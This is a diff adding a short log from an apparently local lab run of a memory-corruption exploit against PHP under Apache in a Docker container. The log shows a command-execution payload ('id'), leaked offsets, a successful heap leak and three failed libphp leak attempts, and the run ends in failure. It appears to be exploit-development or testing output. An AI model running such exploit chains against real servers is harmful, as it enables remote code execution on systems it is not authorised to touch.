@@ -1,0 +1,18 @@
+[*] no offsets file; reading libphp symbols from container 9bie-lab
+cannot copy /usr/lib/apache2/modules/libphp.so from container '9bie-lab': Error response from daemon: remount-ro /home/davide/.local/share/docker/overlay2/629b9a8a81cebd3430d4223aeb02c72eef99954bb28edbea4e01326fb526e274/merged/var/www/html, flags: 0x1021: operation not permitted
+[*] target http://127.0.0.1:18088/index.php (cmd='id>/out/p1')
+[*] offsets: zif=0x43a870 dtor=0x613c50 htdata=0x690d8
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7f1838000000
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 1/3)
+[-] libphp leak missed
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 2/3)
+[-] libphp leak missed
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 3/3)
+[-] libphp leak missed
+[*] rotating worker over HTTP
+LIBPHP_LEAK_FAILED
